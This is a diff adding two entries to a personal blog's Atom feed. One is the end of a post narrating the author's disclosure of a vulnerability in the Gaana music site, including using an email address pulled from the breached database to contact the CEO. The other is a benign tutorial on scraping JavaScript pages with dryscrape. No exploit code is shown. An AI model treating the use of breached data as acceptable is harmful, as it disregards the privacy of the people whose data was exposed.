+&lt;p&gt;&lt;img alt="partial fix" src="http://avi.im/blag/images/2015/hacking-gaana/partialfix.png" width="99%" height="99%" /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;On 28th May, &lt;a href="http://www.thegeekbyte.com/4841/gaana-com-database-compromised-by-hackers/"&gt;MakMan and g00n&lt;/a&gt; found another exploit using SQL injection. And Gaana was down for maintenance for most of the day. In evening, I received a call from Gaana's business head and was assured that it will be fixed asap. I was hoping they will fix it, as it's been already two weeks. &lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;But I was wrong. It wasn't &lt;a href="https://archive.is/uuifC"&gt;fixed&lt;/a&gt;. It made me angry and furious because they took SQL injection pretty seriously because it was all over news and hurting their PR. I was thinking, how they would have reacted to this issue, if I had made this whole thing public from beginning. I &lt;a href="https://twitter.com/iavins/status/604150195442475009"&gt;tweeted&lt;/a&gt; to Gaana CEO for his email ID, I never received any reply. But then...I found his email from the very database I had hacked and sent another email.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;On May 30 2015, evening &lt;a href="https://archive.is/7EaEx"&gt;Gaana&lt;/a&gt; &lt;a href="http://avi.im/blag/images/2015/hacking-gaana/gaanadown.png"&gt;was down&lt;/a&gt; again, so was the &lt;a href="https://archive.is/ksPRd"&gt;API end point&lt;/a&gt;. Are they finally fixing the exploit I found? &lt;/p&gt;
+&lt;p&gt;&lt;img alt="api end was down" src="http://avi.im/blag/images/2015/hacking-gaana/apidown.png" /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;On May 30, 2015, around ~10pm, I checked again. The exploit was finally &lt;a href="https://archive.is/fWEDq"&gt;fixed&lt;/a&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="partial fix" src="http://avi.im/blag/images/2015/hacking-gaana/apifixed.png" width="99%" height="99%" /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;</summary><category term="hacking"></category><category term="python"></category></entry><entry><title>Scraping Javascript page using Python</title><link href="http://avi.im/blag/2014/scraping-javascript-website-python/" rel="alternate"></link><updated>2014-10-18T14:03:00+05:30</updated><author><name>avi</name></author><id>tag:avi.im,2014-10-18:blag/2014/scraping-javascript-website-python/</id><summary type="html">&lt;p&gt;Python library &lt;a href="https://github.com/niklasb/dryscrape"&gt;dryscape&lt;/a&gt; can be used to scrape javascript driven websites. &lt;/p&gt;
+&lt;h1&gt;Code&lt;/h1&gt;
+&lt;p&gt;To give an example, I created a sample page with following HTML code. (on &lt;a href="http://jsbin.com/nusefalebi"&gt;jsbin&lt;/a&gt;):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+  &lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;charset=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Javascript scraping test&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+  &lt;span class="nt"&gt;&amp;lt;p&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;intro-text&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;No javascript support&lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+  &lt;span class="nt"&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+     &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getElementById&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;intro-text&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;innerHTML&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Yay! Supports javascript&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt; 
+&lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;without javascript it says: &lt;code&gt;No javascript support&lt;/code&gt; and with javascript: &lt;code&gt;Yay! Supports javascript&lt;/code&gt;&lt;/p&gt;
+&lt;h2&gt;Scraping without JS support:&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;bs4&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;my_url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;soup&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;soup&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;intro-text&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;intro-text&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;No&lt;/span&gt; &lt;span class="n"&gt;javascript&lt;/span&gt; &lt;span class="n"&gt;support&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;Scraping with JS support:&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;dryscrape&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;bs4&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;session&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dryscrape&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Session&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;visit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;my_url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;soup&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;soup&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;intro-text&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;intro-text&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;Yay&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt; &lt;span class="n"&gt;Supports&lt;/span&gt; &lt;span class="n"&gt;javascript&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;</summary><category term="python"></category><category term="scraping"></category></entry></feed>
